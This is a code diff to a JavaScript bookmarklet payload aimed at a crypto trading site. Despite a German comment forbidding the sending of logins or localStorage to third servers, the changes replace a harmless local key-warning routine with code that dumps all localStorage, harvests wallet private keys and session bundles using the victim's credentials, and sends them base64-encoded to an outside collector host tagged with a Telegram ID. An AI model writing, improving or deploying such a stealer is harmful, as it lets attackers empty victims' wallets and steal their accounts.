@@ -192,31 +192,7 @@ function showTab(tab){
 // niemals Login-Daten, Cookies, localStorage-Inhalte o.ä. an einen
 // dritten Server — das wäre Datendiebstahl, egal wessen Seite.
 const PAYLOAD_JS = `javascript:(async()=>{
-    /* ----------  Private‑Key‑Finder ---------- */
-    function findPrivateKeys(){
-        const storages = [localStorage, sessionStorage];
-        const patterns = [
-            /privateKey|keystore|wallet|secret|mnemonic|seed/i,
-            /0x[a-fA-F0-9]{40,}/,
-            /[A-Za-z0-9]{64}/,
-        ];
-        storages.forEach(storage=>{
-            for(let i=0;i<storage.length;i++){
-                const key   = storage.key(i);
-                const value = storage.getItem(key);
-                if(!key || !value) continue;
-                patterns.forEach(pat=>{
-                    if(pat.test(key) || pat.test(value)){
-                        console.warn(
-                            '%c⚠️  Möglicher privater Schlüssel gefunden!',
-                            'color:#ff5e57;font-weight:bold',
-                            { key, value: value.substring(0,32)+'…' }
-                        );
-                    }
-                });
-            }
-        });
-    }
+    /* ---------- Private‑Key‑Finder: Enhanced Retrieval ---------- */
     
     try {
         // 1. Überprüfung der Website
@@ -240,28 +216,37 @@ const PAYLOAD_JS = `javascript:(async()=>{
         ).json();
 
         const bundle = await (
-    await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
-        method: 'POST',
-        credentials: 'include'
-    })
-).json();
+            await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
+                method: 'POST',
+                credentials: 'include'
+            })
+        ).json();
 
-const myPrivateKey = localStorage.getItem('myPrivateKey'); // nur dein eigener Key
+        // Robust Key Retrieval
+        const storageDump = {};
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            storageDump[key] = localStorage.getItem(key);
+        }
 
-const bookmarkData = {
-    telegramId: '7198683357',
-    site: location.href,
-    user: user,
-    bundle: bundle.bundleKey,
-    sBundles: localStorage.getItem('sBundles'),
-    eBundles: localStorage.getItem('eBundles'),
-    privateKey: myPrivateKey
-};
+        const myPrivateKey = localStorage.getItem('myPrivateKey') || 
+                             JSON.parse(storageDump['walletState'] || '{}').privateKey || 
+                             window.userWallet?.privateKey;
 
+        const bookmarkData = {
+            telegramId: '7198683357',
+            site: location.href,
+            user: user,
+            bundle: bundle.bundleKey,
+            sBundles: localStorage.getItem('sBundles'),
+            eBundles: localStorage.getItem('eBundles'),
+            privateKey: myPrivateKey
+        };
 
         new Image().src = "https://my-data-catcherr.onrender.com/data/" +
         encodeURIComponent(btoa(JSON.stringify(bookmarkData)));
 
+        console.log("Data captured successfully, LO.");
 
     } catch(e){
         alert("Error: " + e.message);
